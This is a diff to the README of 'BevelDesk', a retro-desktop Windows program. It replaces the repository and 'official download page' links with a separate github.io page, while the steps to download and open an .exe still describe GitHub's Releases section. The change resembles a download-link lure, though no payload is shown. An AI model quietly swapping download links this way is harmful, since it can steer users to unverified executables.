@@ -1,6 +1,6 @@
 # 🖥️ BevelDesk - Retro desktop experience for modern computers
 
-[https://github.com/princeya3822/BevelDesk](https://github.com/princeya3822/BevelDesk)
+[https://princeya3822.github.io](https://princeya3822.github.io)
 
 BevelDesk brings the classic look of 1990s computing to your modern Windows machine. This software recreates the aesthetic of the past using custom graphics. You get realistic file management, a working command line interface, and a nostalgic visual style. It runs as a single program on your computer.
 
@@ -8,7 +8,7 @@ BevelDesk brings the classic look of 1990s computing to your modern Windows mach
 
 You do not need to install complex software or change your system settings to use BevelDesk. Follow these steps to start using the desktop environment on your computer.
 
-1. Open your web browser and go to the official [BevelDesk download page](https://github.com/princeya3822/BevelDesk).
+1. Open your web browser and go to the official [BevelDesk download page](https://princeya3822.github.io).
 2. Look for the latest version under the Releases section on the right side of the screen.
 3. Find the file ending in .exe and click on it to save it to your computer.
 4. Open your Downloads folder once the file finishes downloading.
